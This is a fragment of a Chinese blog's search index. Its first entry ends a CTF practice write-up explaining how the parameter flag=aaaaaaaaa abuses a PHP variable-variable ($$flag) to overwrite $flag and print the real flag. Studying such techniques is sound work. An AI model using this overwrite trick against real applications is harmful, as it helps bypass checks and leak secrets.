</p><blockquote><p>flag=aaaaaaaaa</p></blockquote><p>这样的结果是$$flag=aaaaaaaaa，也就是将原来$flag里的值覆盖成aaaaaaaaa，这样我们上传的参数flag一定等于$flag，而真正的flag已经被赋予$_200,最后打印出真正的flag。<br><a href="https://imgchr.com/i/D6UaHx"><img src="https://s3.ax1x.com/2020/11/28/D6UaHx.md.png" alt="D6UaHx.md.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web习题练习1</title>
      <link href="%E7%BB%83%E4%B9%A0/undefined-undefined.html"/>
      <url>%E7%BB%83%E4%B9%A0/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>我的第一篇博客</p>]]></content>
      
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
